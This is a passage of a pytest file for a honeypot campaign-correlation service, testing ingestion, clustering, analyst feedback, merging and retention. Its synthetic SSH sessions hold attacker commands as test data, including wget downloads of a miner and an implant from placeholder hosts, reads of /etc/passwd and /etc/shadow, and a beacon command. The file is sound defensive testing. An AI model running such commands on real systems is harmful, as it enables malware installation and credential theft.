from __future__ import annotations

from datetime import datetime, timedelta, timezone

from app.correlation.features import CorrelationContext, Session
from app.correlation.scoring import ALGORITHM_VERSION


def _ts(minutes_ago: float) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=minutes_ago)).isoformat()


def _ssh_events(
    *,
    session_id: str,
    ip: str,
    commands: list[str],
    usernames: list[str],
    start_minutes: float = 60,
    client: str = "SSH-2.0-libssh_0.9.6",
    collector: str = "test-collector",
    indicators: list[str] | None = None,
) -> list[dict]:
    events: list[dict] = []
    offset = 0.0
    for _index, username in enumerate(usernames):
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": _ts(start_minutes - offset),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.login_failed",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-ssh-1",
                "severity": "low",
                "provenance": {
                    "collector": collector,
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": indicators or [],
                },
                "features": {"username": username, "success": False, "client_version": client},
            }
        )
        offset += 0.4
    for command in commands:
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": _ts(start_minutes - offset),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.command",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-ssh-1",
                "severity": "medium",
                "provenance": {
                    "collector": collector,
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": indicators or [],
                },
                "features": {
                    "command": command,
                    "username": usernames[0] if usernames else "root",
                    "success": True,
                    "client_version": client,
                },
            }
        )
        offset += 0.7
    return events


def _http_events(
    *, session_id: str, ip: str, paths: list[str], user_agent: str, start_minutes: float = 50
) -> list[dict]:
    events = []
    for index, path in enumerate(paths):
        events.append(
            {
                "schema_version": "1.0",
                "occurred_at": _ts(start_minutes - index * 0.3),
                "source_module": "honeypot",
                "event_type": "honeypot.http.request",
                "source_ip": ip,
                "session_id": session_id,
                "target_id": "decoy-http-1",
                "severity": "info",
                "provenance": {
                    "collector": "test-collector",
                    "source": "http-decoy",
                    "reliability": 0.8,
                    "synthetic": True,
                },
                "features": {
                    "method": "GET",
                    "path": path,
                    "status": 404,
                    "user_agent": user_agent,
                },
            }
        )
    return events


def _ingest(client, headers, events):
    response = client.post("/api/v1/ingest/events", json=events, headers=headers)
    assert response.status_code == 202, response.text
    body = response.json()
    assert body["rejected"] == 0, body
    return body


def _campaigns(client, headers):
    response = client.get("/api/v1/campaigns", headers=headers)
    assert response.status_code == 200
    return response.json()["items"]


def test_multi_ip_related_sessions_become_campaign(client, sensor_headers, admin_headers):
    commands = [
        "uname -a",
        "cat /etc/passwd",
        "wget http://198.51.100.9/xmrig",
        "chmod +x xmrig",
        "./xmrig -o stratum+tcp://pool:3333",
    ]
    shared_indicator = "ja3:9c1f0b1a"
    sessions = [
        ("sess-attack-1", "203.0.113.11", 70),
        ("sess-attack-2", "203.0.113.12", 65),
        ("sess-attack-3", "203.0.113.13", 60),
    ]
    for session_id, ip, start in sessions:
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=session_id,
                ip=ip,
                commands=commands,
                usernames=["root", "admin"],
                start_minutes=start,
                indicators=[shared_indicator],
            ),
        )

    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert run.status_code == 200, run.text
    result = run.json()
    assert result["sessions"] == 3
    assert result["campaigns"] >= 1

    campaigns = _campaigns(client, admin_headers)
    target = next(item for item in campaigns if item["member_count"] == 3)
    assert target["ip_count"] == 3
    assert target["confidence"] >= 0.7
    assert "hypothesis" in target["summary"]

    detail = client.get(f"/api/v1/campaigns/{target['id']}", headers=admin_headers)
    assert detail.status_code == 200
    payload = detail.json()
    assert len(payload["sessions"]) == 3
    assert payload["edges"]
    explanation = payload["explanation"]
    assert explanation["risk"]["risk_score"] > 0
    assert explanation["confidence"] == target["confidence"]
    assert explanation["risk"]["severity"] == "medium"
    assert "ip" in explanation["why_flagged"].lower() or "IP" in explanation["why_flagged"]
    assert explanation["recommended_action"]

    edge = payload["edges"][0]
    evidence = edge["evidence"]
    assert evidence["algorithm_version"] == ALGORITHM_VERSION
    assert len(evidence["components"]) == 8
    assert "action_sequence" in {component["name"] for component in evidence["components"]}
    assert evidence["independent_families"]

    edge_detail = client.get(f"/api/v1/edges/{edge['id']}", headers=admin_headers)
    assert edge_detail.status_code == 200
    assert edge_detail.json()["risk"]["risk_score"] > 0
    assert edge_detail.json()["evidence"]["explanation"]


def test_evaluation_components_use_current_pair_separator():
    from app.correlation.scoring import pair_key
    from app.evaluation.runner import _hypothesis_components

    components = _hypothesis_components(
        [pair_key("session::alpha", "session::beta"), pair_key("session::beta", "session::gamma")]
    )
    assert components == [["session::alpha", "session::beta", "session::gamma"]]


def test_same_ip_unrelated_behaviour_is_not_a_campaign(client, sensor_headers, admin_headers):
    _ingest(
        client,
        sensor_headers,
        _ssh_events(
            session_id="sess-same-ip-a",
            ip="198.51.100.44",
            commands=["uname -a", "id", "ls -la", "ifconfig", "netstat -ant"],
            usernames=["oracle"],
            start_minutes=40,
            client="SSH-2.0-OpenSSH_9.2",
        ),
    )
    _ingest(
        client,
        sensor_headers,
        _ssh_events(
            session_id="sess-same-ip-b",
            ip="198.51.100.44",
            commands=["xmrig --donate-level 1", "crontab -l", "echo hi > /tmp/x"],
            usernames=["ubnt", "support"],
            start_minutes=120,
            client="SSH-2.0-paramiko_3.1",
        ),
    )
    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert run.status_code == 200

    campaigns = _campaigns(client, admin_headers)
    assert not any(
        item["member_count"] >= 2 for item in campaigns
    ), "unrelated sessions sharing an IP must not be grouped"

    graph = client.get("/api/v1/graph", headers=admin_headers).json()
    session_edges = [
        edge for edge in graph["edges"] if edge["kind"] == "session_similarity"
    ]
    assert not any(edge["status"] == "active" for edge in session_edges)


def test_benign_lookalikes_are_not_grouped(client, sensor_headers, admin_headers):
    paths_a = ["/admin", "/login", "/robots.txt", "/sitemap.xml"]
    paths_b = ["/admin/", "/login/", "/robots.txt", "/favicon.ico"]
    _ingest(
        client,
        sensor_headers,
        _http_events(
            session_id="sess-benign-a", ip="192.0.2.10", paths=paths_a, user_agent="Mozilla/5.0 monitor"
        ),
    )
    _ingest(
        client,
        sensor_headers,
        _http_events(
            session_id="sess-benign-b", ip="192.0.2.11", paths=paths_b, user_agent="python-requests/2.31"
        ),
    )
    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert run.status_code == 200

    campaigns = _campaigns(client, admin_headers)
    assert not any(item["member_count"] >= 2 for item in campaigns)

    graph = client.get("/api/v1/graph", headers=admin_headers).json()
    assert any(node["kind"] == "session" for node in graph["nodes"])
    assert graph["algorithm_version"] == ALGORITHM_VERSION
    assert "hypothesis" in graph["note"]


def test_feedback_is_recorded_and_marks_campaign(client, sensor_headers, admin_headers):
    commands = ["uname -a", "cat /etc/passwd", "wget http://198.51.100.9/tool"]
    for index in range(2):
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=f"sess-feedback-{index}",
                ip=f"203.0.113.{20 + index}",
                commands=commands,
                usernames=["root"],
                start_minutes=30 - index,
            ),
        )
    client.post("/api/v1/correlate", json={}, headers=admin_headers)
    campaign = _campaigns(client, admin_headers)[0]

    response = client.post(
        "/api/v1/feedback",
        headers=admin_headers,
        json={
            "object_type": "campaign",
            "object_id": campaign["id"],
            "label": "supported",
            "note": "Matches the ticket from the same morning.",
        },
    )
    assert response.status_code == 201
    updated = client.get(f"/api/v1/campaigns/{campaign['id']}", headers=admin_headers).json()
    assert updated["campaign"]["status"] == "confirmed"

    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
    assert overview["counts"]["campaign"]["supported"] == 1
    assert "never retrains" in overview["note"]


def test_feedback_rejects_oversized_object_id(client, admin_headers):
    response = client.post(
        "/api/v1/feedback",
        headers=admin_headers,
        json={"object_type": "campaign", "object_id": "c" * 65, "label": "supported"},
    )
    assert response.status_code == 422


def test_feedback_rejects_unknown_object(client, admin_headers):
    response = client.post(
        "/api/v1/feedback",
        headers=admin_headers,
        json={"object_type": "campaign", "object_id": "cmp_missing", "label": "supported"},
    )
    assert response.status_code == 404


def test_session_ids_with_separators_do_not_break_campaigns(client, sensor_headers, admin_headers):
    commands = ["uname -a", "cat /etc/passwd", "wget http://198.51.100.9/tool"]
    for index in range(2):
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=f"sess::separator,{index}",
                ip=f"203.0.113.{30 + index}",
                commands=commands,
                usernames=["root"],
                start_minutes=30 - index,
            ),
        )
    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert run.status_code == 200, run.text
    assert run.json()["campaigns"] >= 1


def test_viewer_cannot_run_correlation(client, viewer_headers):
    response = client.post("/api/v1/correlate", json={}, headers=viewer_headers)
    assert response.status_code == 403


def test_small_corpus_does_not_filter_shared_evidence():
    """On a handful of sessions every token would look ubiquitous.

    The corpus filter must stay out of the way until document frequency is a
    meaningful estimate, otherwise identical sessions compare as empty.
    """

    sessions = [
        Session(
            id=f"sess-small-{index}",
            source_ips={f"198.51.100.{index + 1}"},
            usernames={"root"},
            clients={"SSH-2.0-libssh_0.9.6"},
            commands=["uname -a", "wget http://198.51.100.200/x"],
        )
        for index in range(6)
    ]
    context = CorrelationContext.from_sessions(sessions)

    assert context.n_sessions == 6
    assert context.is_informative("username", "root")
    assert context.is_informative("client", "SSH-2.0-libssh_0.9.6")


def test_retired_and_demoted_edges_leave_their_campaign(client):
    """Campaign evidence must be the edges that currently support it."""
    from sqlalchemy import select

    from app.correlation.engine import _digest, _upsert_edge_row
    from app.correlation.repository import get_campaign
    from app.correlation.scoring import pair_key
    from app.core.security import iso, utcnow
    from app.db.database import connection, dumps
    from app.db.schema import campaigns, graph_edges

    now = utcnow()
    campaign_id = "cmp_retired"
    with connection() as conn:
        conn.execute(
            campaigns.insert().values(
                id=campaign_id,
                name="candidate test",
                status="candidate",
                confidence=0.9,
                summary="test",
                evidence=dumps({"sessions": ["alpha", "beta"]}),
                created_at=iso(now),
                updated_at=iso(now),
                algorithm_version=ALGORITHM_VERSION,
                member_count=2,
                ip_count=2,
            )
        )
        for label, status in (("kept", "active"), ("retired", "hypothesis")):
            left, right = f"alpha-{label}", f"beta-{label}"
            conn.execute(
                graph_edges.insert().values(
                    id=f"edg_{_digest(pair_key(left, right))}",
                    kind="session_similarity",
                    src_id=f"session:{left}",
                    dst_id=f"session:{right}",
                    confidence=0.9,
                    score=0.9,
                    evidence=dumps({"explanation": "test"}),
                    contradictions=dumps([]),
                    algorithm_version=ALGORITHM_VERSION,
                    created_at=iso(now),
                    updated_at=iso(now),
                    expires_at=None,
                    status=status,
                    campaign_id=campaign_id,
                )
            )

    detail = get_campaign(campaign_id)
    assert [edge["status"] for edge in detail["edges"]] == ["active"]

    # A relationship that loses its link loses its campaign too, so a later
    # campaign view cannot present it as supporting evidence.
    with connection() as conn:
        _upsert_edge_row(
            conn,
            edge_id=f"edg_{_digest(pair_key('alpha-kept', 'beta-kept'))}",
            kind="session_similarity",
            src="session:alpha-kept",
            dst="session:beta-kept",
            confidence=0.4,
            score=0.4,
            evidence={"explanation": "demoted"},
            contradictions=[],
            now=now,
            expires_at=None,
            status="hypothesis",
        )
        row = conn.execute(
            select(graph_edges.c.status, graph_edges.c.campaign_id).where(
                graph_edges.c.id == f"edg_{_digest(pair_key('alpha-kept', 'beta-kept'))}"
            )
        ).fetchone()
    assert row[0] == "hypothesis"
    assert row[1] is None
    assert get_campaign(campaign_id)["edges"] == []


def test_expiry_retires_a_relationship_without_erasing_its_evidence(client):
    from sqlalchemy import select

    from app.correlation.engine import _digest, _expire_pair
    from app.correlation.scoring import pair_key
    from app.core.security import iso, utcnow
    from app.db.database import connection, dumps, loads
    from app.db.schema import graph_edges

    now = utcnow()
    key = pair_key("gamma-one", "gamma-two")
    edge_id = f"edg_{_digest(key)}"
    original = {
        "components": [{"name": "action_sequence", "score": 0.91}],
        "explanation": "linked as related activity",
        "algorithm_version": ALGORITHM_VERSION,
    }
    with connection() as conn:
        conn.execute(
            graph_edges.insert().values(
                id=edge_id,
                kind="session_similarity",
                src_id="session:gamma-one",
                dst_id="session:gamma-two",
                confidence=0.92,
                score=0.9,
                evidence=dumps(original),
                contradictions=dumps([]),
                algorithm_version=ALGORITHM_VERSION,
                created_at=iso(now),
                updated_at=iso(now),
                expires_at=None,
                status="active",
                campaign_id="cmp_gamma",
            )
        )
        _expire_pair(conn, key, now)
        row = conn.execute(
            select(graph_edges.c.status, graph_edges.c.campaign_id, graph_edges.c.evidence).where(
                graph_edges.c.id == edge_id
            )
        ).fetchone()

    assert row[0] == "expired"
    assert row[1] is None
    evidence = loads(row[2], {})
    assert evidence["components"] == original["components"]
    assert evidence["explanation"] == original["explanation"]
    assert evidence["expired_at"]


def test_overlapping_correlation_runs_are_rejected_before_they_race(client, admin_headers):
    from app.correlation import engine

    with engine._CORRELATION_LOCK:
        blocked = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert blocked.status_code == 409, blocked.text
    assert blocked.json()["error"]["code"] == "conflict"

    allowed = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert allowed.status_code == 200, allowed.text


def _feedback(client, headers, campaign_id: str, label: str, note: str = "") -> dict:
    response = client.post(
        "/api/v1/feedback",
        headers=headers,
        json={"object_type": "campaign", "object_id": campaign_id, "label": label, "note": note},
    )
    assert response.status_code == 201, response.text
    return response.json()


def test_campaign_identity_survives_membership_growth(client, sensor_headers, admin_headers):
    """An added session must not produce a new campaign and orphan the review."""
    commands = [
        "uname -a",
        "cat /etc/passwd",
        "wget http://198.51.100.9/xmrig",
        "chmod +x xmrig",
        "./xmrig -o stratum+tcp://pool:3333",
    ]
    for index in range(2):
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=f"sess-grow-{index}",
                ip=f"203.0.113.{111 + index}",
                commands=commands,
                usernames=["root", "admin"],
                start_minutes=70 - index,
                indicators=["ja3:grow"],
            ),
        )
    client.post("/api/v1/correlate", json={}, headers=admin_headers)
    campaign = next(item for item in _campaigns(client, admin_headers) if item["member_count"] == 2)
    original_id = campaign["id"]
    _feedback(client, admin_headers, original_id, "supported", "Seen in the same intrusion window.")

    _ingest(
        client,
        sensor_headers,
        _ssh_events(
            session_id="sess-grow-2",
            ip="203.0.113.113",
            commands=commands,
            usernames=["root", "admin"],
            start_minutes=60,
            indicators=["ja3:grow"],
        ),
    )
    client.post("/api/v1/correlate", json={}, headers=admin_headers)

    detail = client.get(f"/api/v1/campaigns/{original_id}", headers=admin_headers).json()
    assert detail["campaign"]["member_count"] == 3
    assert detail["campaign"]["algorithm_version"] == ALGORITHM_VERSION
    assert detail["campaign"]["status"] == "confirmed"
    assert detail["campaign"]["status_updated_at"]
    assert "sess-grow-2" in detail["evidence"]["sessions"]
    assert detail["evidence"]["membership_history"][-1]["added"] == ["sess-grow-2"]

    listed = next(
        item for item in _campaigns(client, admin_headers) if item["id"] == original_id
    )
    assert listed["member_count"] == 3
    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
    assert overview["recent"][0]["object_id"] == original_id


def test_reviewed_campaign_is_archived_when_its_links_disappear(client, sensor_headers, admin_headers):
    """Disappearing evidence must not delete the record of an analyst's decision."""
    from sqlalchemy import text

    from app.db.database import connection

    commands = ["uname -a", "id", "wget http://198.51.100.9/tool", "chmod +x tool"]
    for index in range(2):
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=f"sess-archive-{index}",
                ip=f"203.0.113.{121 + index}",
                commands=commands,
                usernames=["root"],
                start_minutes=80 - index,
                indicators=["ja3:archive"],
            ),
        )
    client.post("/api/v1/correlate", json={}, headers=admin_headers)
    campaign = next(item for item in _campaigns(client, admin_headers) if item["member_count"] == 2)
    _feedback(client, admin_headers, campaign["id"], "rejected", "Separate maintenance activity.")

    with connection() as conn:
        conn.execute(text("DELETE FROM events"))
        conn.execute(
            text(
                "UPDATE graph_edges SET expires_at = '2000-01-01T00:00:00+00:00' "
                "WHERE kind = 'session_similarity'"
            )
        )
    run = client.post("/api/v1/correlate", json={}, headers=admin_headers)
    assert run.status_code == 200
    assert run.json()["campaigns_archived"] == 1

    assert not any(item["id"] == campaign["id"] for item in _campaigns(client, admin_headers))
    archived = client.get(
        "/api/v1/campaigns?include_archived=true", headers=admin_headers
    ).json()["items"]
    record = next(item for item in archived if item["id"] == campaign["id"])
    assert record["status"] == "rejected"
    assert record["archived_at"]

    detail = client.get(f"/api/v1/campaigns/{campaign['id']}", headers=admin_headers)
    assert detail.status_code == 200
    assert detail.json()["campaign"]["archived"] is True
    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
    assert overview["counts"]["campaign"]["rejected"] == 1

    # The relationship can return.  When it does, the review returns with it
    # rather than a fresh identity being minted beside the archived one.
    for index in range(2):
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=f"sess-archive-{index}",
                ip=f"203.0.113.{121 + index}",
                commands=commands,
                usernames=["root"],
                start_minutes=70 - index,
                indicators=["ja3:archive"],
            ),
        )
    client.post("/api/v1/correlate", json={}, headers=admin_headers)
    restored = next(
        item for item in _campaigns(client, admin_headers) if item["id"] == campaign["id"]
    )
    assert restored["status"] == "rejected"
    assert restored["archived_at"] is None
    history = client.get(
        f"/api/v1/campaigns/{campaign['id']}", headers=admin_headers
    ).json()["evidence"]["membership_history"]
    assert history[-1]["event"] == "reactivated"


def _seed_merge_state(client, sensor_headers, admin_headers) -> tuple[str, str]:
    """Two reviewed campaigns whose sessions now share one toolkit.

    The campaign rows stand in for the previous correlation run, which had
    produced two separate two-session clusters.  The telemetry now supports a
    single four-session cluster, so the next run has to merge the identities.
    """
    from app.core.security import iso, utcnow
    from app.db.database import connection, dumps
    from app.db.schema import campaigns

    commands = [
        "uname -a",
        "cat /etc/shadow",
        "wget http://198.51.100.9/implant",
        "chmod +x implant",
        "./implant --beacon 192.0.2.80:443",
    ]
    counter = 0
    for group in ("a", "b"):
        for index in range(2):
            counter += 1
            _ingest(
                client,
                sensor_headers,
                _ssh_events(
                    session_id=f"sess-merge-{group}-{index}",
                    ip=f"203.0.113.{140 + counter}",
                    commands=commands,
                    usernames=["svc-merge"],
                    start_minutes=90 - counter,
                    client="SSH-2.0-merge",
                    indicators=["ja3:merge"],
                ),
            )
    now = utcnow()
    with connection() as conn:
        for group in ("a", "b"):
            members = [f"sess-merge-{group}-0", f"sess-merge-{group}-1"]
            conn.execute(
                campaigns.insert().values(
                    id=f"cmp_merge_{group}",
                    name=f"candidate {group}",
                    status="candidate",
                    confidence=0.9,
                    summary="prior run",
                    evidence=dumps({"sessions": members, "ips": [], "edges": []}),
                    created_at=iso(now),
                    updated_at=iso(now),
                    algorithm_version=ALGORITHM_VERSION,
                    member_count=2,
                    ip_count=2,
                )
            )
    return "cmp_merge_a", "cmp_merge_b"


def test_merged_campaigns_carry_the_analyst_decision(client, sensor_headers, admin_headers):
    survivor_id, absorbed_id = _seed_merge_state(client, sensor_headers, admin_headers)
    _feedback(client, admin_headers, absorbed_id, "rejected", "Unrelated scanner noise.")

    client.post("/api/v1/correlate", json={}, headers=admin_headers)

    merged = next(
        item for item in _campaigns(client, admin_headers) if item["member_count"] == 4
    )
    assert merged["id"] == survivor_id
    assert merged["status"] == "rejected"
    archived = client.get(
        "/api/v1/campaigns?include_archived=true", headers=admin_headers
    ).json()["items"]
    absorbed = next(item for item in archived if item["id"] == absorbed_id)
    assert absorbed["superseded_by"] == survivor_id
    assert absorbed["archived_at"]
    survivor = client.get(f"/api/v1/campaigns/{survivor_id}", headers=admin_headers).json()
    carried = [
        entry
        for entry in survivor["evidence"].get("review_history", [])
        if entry["event"] == "status_carried"
    ]
    assert carried and carried[-1]["to"] == "rejected"
    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
    assert overview["recent"][0]["object_id"] == survivor_id

    # A late review submitted against the absorbed identifier is recorded on
    # the survivor, and the response says where it was redirected from.
    late = _feedback(client, admin_headers, absorbed_id, "uncertain", "Reviewed after the merge.")
    assert late["object_id"] == survivor_id
    assert late["redirected_from"] == absorbed_id


def test_conflicting_merged_reviews_become_uncertain(client, sensor_headers, admin_headers):
    survivor_id, absorbed_id = _seed_merge_state(client, sensor_headers, admin_headers)
    _feedback(client, admin_headers, survivor_id, "supported", "Confirmed from the ticket.")
    _feedback(client, admin_headers, absorbed_id, "rejected", "Unrelated scanner noise.")

    client.post("/api/v1/correlate", json={}, headers=admin_headers)

    merged = next(
        item for item in _campaigns(client, admin_headers) if item["member_count"] == 4
    )
    assert merged["status"] == "uncertain"
    survivor = client.get(f"/api/v1/campaigns/{survivor_id}", headers=admin_headers).json()
    carried = [
        entry
        for entry in survivor["evidence"].get("review_history", [])
        if entry["event"] == "status_carried"
    ]
    assert carried
    assert carried[-1]["to"] == "uncertain"
    overview = client.get("/api/v1/feedback", headers=admin_headers).json()
    assert {item["object_id"] for item in overview["recent"]} == {survivor_id}


def _incremental_seed(client, sensor_headers) -> list[str]:
    # Repeated commands keep the n-gram vocabulary stable when a later event
    # repeats one, which lets the test isolate a session change from a corpus
    # change.
    commands = ["uname -a"] * 3
    ids = []
    for index in range(3):
        session_id = f"sess-inc-{index}"
        ids.append(session_id)
        _ingest(
            client,
            sensor_headers,
            _ssh_events(
                session_id=session_id,
                ip=f"203.0.113.{160 + index}",
                commands=commands,
                usernames=["root"],
                start_minutes=70 - index,
                indicators=["ja3:incremental"],
            ),
        )
    return ids


def test_second_run_reuses_pairs_when_nothing_changed(client, sensor_headers, admin_headers):
    _incremental_seed(client, sensor_headers)
    first = client.post("/api/v1/correlate", json={}, headers=admin_headers).json()
    assert first["incremental"] is False
    assert first["pairs_total"] == 3
    assert first["pairs_scored"] == 3
    assert first["pairs_reused"] == 0
    campaigns = _campaigns(client, admin_headers)
    assert len(campaigns) == 1

    second = client.post("/api/v1/correlate", json={}, headers=admin_headers).json()
    assert second["incremental"] is True
    assert second["pairs_scored"] == 0
    assert second["pairs_reused"] == 3
    assert second["edges_expired"] == 0
    again = _campaigns(client, admin_headers)
    assert [item["id"] for item in again] == [item["id"] for item in campaigns]
    assert again[0]["member_count"] == 3


def test_changed_session_rescores_only_its_pairs(client, sensor_headers, admin_headers):
    ids = _incremental_seed(client, sensor_headers)
    client.post("/api/v1/correlate", json={}, headers=admin_headers)
    # One more command from a new address changes that session's fingerprint
    # but repeats vocabulary already present, so the corpus fingerprint and
    # the other sessions stay put.
    _ingest(
        client,
        sensor_headers,
        [
            {
                "schema_version": "1.0",
                "occurred_at": _ts(5),
                "source_module": "honeypot",
                "event_type": "honeypot.ssh.command",
                "source_ip": "203.0.113.190",
                "session_id": ids[0],
                "target_id": "decoy-ssh-1",
                "severity": "medium",
                "provenance": {
                    "collector": "test-collector",
                    "source": "cowrie",
                    "reliability": 0.9,
                    "synthetic": True,
                    "indicators": ["ja3:incremental"],
                },
                "features": {
                    "command": "uname -a",
                    "username": "root",
                    "success": True,
                    "client_version": "SSH-2.0-libssh_0.9.6",
                },
            }
        ],
    )
    run = client.post("/api/v1/correlate", json={}, headers=admin_headers).json()
    assert run["incremental"] is True
    assert run["pairs_total"] == 3
    assert run["pairs_reused"] == 1
    assert run["pairs_scored"] == 2


def test_new_session_changes_the_corpus_and_forces_a_full_rescan(client, sensor_headers, admin_headers):
    _incremental_seed(client, sensor_headers)
    client.post("/api/v1/correlate", json={}, headers=admin_headers)
    _ingest(
        client,
        sensor_headers,
        _ssh_events(
            session_id="sess-inc-new",
            ip="203.0.113.199",
            commands=["uname -a", "ifconfig", "netstat -ant"],
            usernames=["ops"],
            start_minutes=30,
            client="SSH-2.0-other",
        ),
    )
    run = client.post("/api/v1/correlate", json={}, headers=admin_headers).json()
    assert run["incremental"] is False
    assert run["pairs_total"] == 6
    assert run["pairs_reused"] == 0
    assert run["pairs_scored"] == 6


def test_graph_retention_keeps_open_evidence_and_archived_reviews(client):
    """Retention must delete only retired evidence past the horizon."""
    import pytest
    from sqlalchemy import select

    from app.db.retention import purge_graph
    from app.core.security import iso, utcnow
    from app.db.database import connection, dumps
    from app.db.schema import campaigns, graph_edges, graph_nodes

    old = iso(utcnow() - timedelta(days=60))
    recent = iso(utcnow() - timedelta(hours=6))
    campaigns_row = {
        "id": "cmp_retained",
        "name": "archived review",
        "status": "rejected",
        "confidence": 0.8,
        "summary": "test",
        "evidence": dumps({"sessions": []}),
        "created_at": old,
        "updated_at": old,
        "algorithm_version": ALGORITHM_VERSION,
        "member_count": 1,
        "ip_count": 1,
        "archived_at": old,
    }
    nodes = {
        "session:purged": "session",
        "ip:purged": "ip",
        "session:recently_retired": "session",
        "ip:recently_retired": "ip",
        "session:active": "session",
        "ip:active": "ip",
        "campaign:cmp_retained": "campaign",
        "session:stale_observation": "session",
        "ip:stale_observation": "ip",
        "ip:observation_kept": "ip",
    }
    edges = [
        # Retired long ago: delete the edge, then any endpoint left orphaned.
        ("edg_purge", "session_similarity", "session:purged", "ip:purged", "expired", old),
        # Retired, but inside the window: keep edge and its endpoints even
        # though the nodes themselves are older than the horizon.
        (
            "edg_recent",
            "session_similarity",
            "session:recently_retired",
            "ip:recently_retired",
            "expired",
            recent,
        ),
        # Open evidence is never deleted by age.
        ("edg_active", "session_similarity", "session:active", "ip:active", "active", old),
        (
            "edg_hypothesis",
            "session_similarity",
            "session:active",
            "session:purged",
            "hypothesis",
            old,
        ),
        (
            "edg_contains",
            "campaign_contains",
            "campaign:cmp_retained",
            "session:active",
            "active",
            old,
        ),
        # Observation records are permanent while their session is live, so
        # they leave with a session that is past the horizon and unreferenced.
        (
            "edg_observation_stale",
            "observed_from",
            "session:stale_observation",
            "ip:stale_observation",
            "active",
            old,
        ),
        # The same record for a session still carrying live similarity evidence
        # must stay, even though the session itself is old.
        (
            "edg_observation_kept",
            "observed_from",
            "session:active",
            "ip:observation_kept",
            "active",
            old,
        ),
    ]
    with connection() as conn:
        conn.execute(campaigns.insert().values(**campaigns_row))
        for node_id, kind in nodes.items():
            conn.execute(
                graph_nodes.insert().values(
                    id=node_id,
                    kind=kind,
                    label=node_id.split(":", 1)[1],
                    props="{}",
                    first_seen=old,
                    last_seen=old,
                )
            )
        for edge_id, kind, src, dst, status, updated in edges:
            conn.execute(
                graph_edges.insert().values(
                    id=edge_id,
                    kind=kind,
                    src_id=src,
                    dst_id=dst,
                    confidence=0.9,
                    score=0.9,
                    evidence=dumps({"explanation": "test"}),
                    contradictions=dumps([]),
                    algorithm_version=ALGORITHM_VERSION,
                    created_at=updated,
                    updated_at=updated,
                    expires_at=None,
                    status=status,
                )
            )

    with pytest.raises(ValueError):
        purge_graph(days=0)
    result = purge_graph(days=30)
    assert result["days"] == 30
    assert result["edges"] == 1
    assert result["observations"] == 1
    # ``session:purged`` survives because the open hypothesis still uses it;
    # ``ip:purged`` and both stale-observation nodes lose their last reference.
    assert result["nodes"] == 3

    with connection() as conn:
        remaining_edges = {
            row[0] for row in conn.execute(select(graph_edges.c.id)).fetchall()
        }
        remaining_nodes = {
            row[0] for row in conn.execute(select(graph_nodes.c.id)).fetchall()
        }
        review = conn.execute(
            select(campaigns.c.status).where(campaigns.c.id == "cmp_retained")
        ).fetchone()
    assert remaining_edges == {
        "edg_recent",
        "edg_active",
        "edg_hypothesis",
        "edg_contains",
        "edg_observation_kept",
    }
    # ``session:purged`` is still referenced by the open hypothesis, so it stays.
    assert remaining_nodes == {
        "session:recently_retired",
        "ip:recently_retired",
        "session:active",
        "ip:active",
        "session:purged",
        "campaign:cmp_retained",
        "ip:observation_kept",
    }
    assert review is not None and review[0] == "rejected"


def test_campaign_detail_ranks_missing_evidence_and_reports_observation_cost(client):
    """The acquisition plan must rank gaps by how many pairs they weaken.

    The plan is the analyst-facing half of the evidence model: an unavailable
    component carries no weight today, so its weight is the ceiling that new
    collection could recover, and the affected-pair count says how much of the
    campaign depends on it.
    """
    from app.correlation.repository import get_campaign
    from app.core.security import iso, utcnow
    from app.db.database import connection, dumps
    from app.db.schema import campaigns, graph_edges, graph_nodes

    now = utcnow()
    campaign_id = "cmp_plan"
    components = {
        "left": [
            {"name": "intel_reputation", "family": "intel", "weight": 0.25, "available": False, "score": 0.0, "detail": "no reputation feed"},
            {"name": "toolchain_client", "family": "toolchain", "weight": 0.2, "available": True, "score": 0.8, "detail": "same SSH client"},
        ],
        "right": [
            {"name": "intel_reputation", "family": "intel", "weight": 0.25, "available": False, "score": 0.0, "detail": "no reputation feed"},
            {"name": "identity_certificate", "family": "identity", "weight": 0.3, "available": False, "score": 0.0, "detail": "no certificate seen"},
        ],
    }
    with connection() as conn:
        conn.execute(
            campaigns.insert().values(
                id=campaign_id,
                name="plan test",
                status="candidate",
                confidence=0.82,
                summary="two linked sessions",
                evidence=dumps(
                    {"sessions": ["plan-alpha", "plan-beta", "plan-gamma"], "ips": ["198.51.100.10"]}
                ),
                created_at=iso(now),
                updated_at=iso(now),
                algorithm_version=ALGORITHM_VERSION,
                member_count=3,
                ip_count=1,
            )
        )
        for label, events in (("alpha", 4), ("beta", 10), ("gamma", 6)):
            conn.execute(
                graph_nodes.insert().values(
                    id=f"session:plan-{label}",
                    kind="session",
                    label=f"plan {label}",
                    props=dumps(
                        {
                            "source_ips": ["198.51.100.10"],
                            "event_count": events,
                            "severity_max": "medium",
                        }
                    ),
                    first_seen=iso(now),
                    last_seen=iso(now),
                )
            )
        for label, peer in (("left", "beta"), ("right", "gamma")):
            conn.execute(
                graph_edges.insert().values(
                    id=f"edg_plan_{label}",
                    kind="session_similarity",
                    src_id="session:plan-alpha",
                    dst_id=f"session:plan-{peer}",
                    confidence=0.82,
                    score=0.86,
                    evidence=dumps({"explanation": "shared behaviour", "components": components[label]}),
